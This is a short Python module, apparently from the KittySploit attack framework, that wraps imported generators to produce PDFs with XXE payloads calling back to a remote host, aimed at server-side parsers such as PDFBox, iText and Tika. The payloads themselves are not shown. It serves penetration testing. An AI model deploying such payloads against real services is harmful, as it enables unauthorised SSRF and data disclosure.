#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfPhonehomeMixin, format_test_ids
from lib.pdf.generators.javascript import write_js_xxe_xmldata
from lib.pdf.generators.xxe import write_xxe_xmp_metadata, write_xxe_xfa_acroform, write_xfa_xxe_oob


class Module(Auxiliary, PdfPhonehomeMixin):
    __info__ = {
        "name": "PDF XXE Payload Generator",
        "description": (
            "Generate PDFs with XML external entity callbacks in XMP metadata, XFA "
            "forms, Acrobat JavaScript XMLData.parse(), and OOB parameter entities "
            "targeting server-side parsers (PDFBox, iText, Apache Tika)."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2016-2175",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-9096",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-66516",
        ],
        "tags": ["pdf", "xxe", "ssrf", "callback", "tika", "pdfbox"],
    }

    PDF_GENERATORS = (
        write_js_xxe_xmldata,
        write_xxe_xmp_metadata,
        write_xxe_xfa_acroform,
        write_xfa_xxe_oob,
    )

    MODULE_TITLE = "PDF XXE payload generator"

    def run(self):
        print_info(f"    Test ids: {format_test_ids(self.PDF_GENERATORS)}")
        return self.run_pdf_phonehome()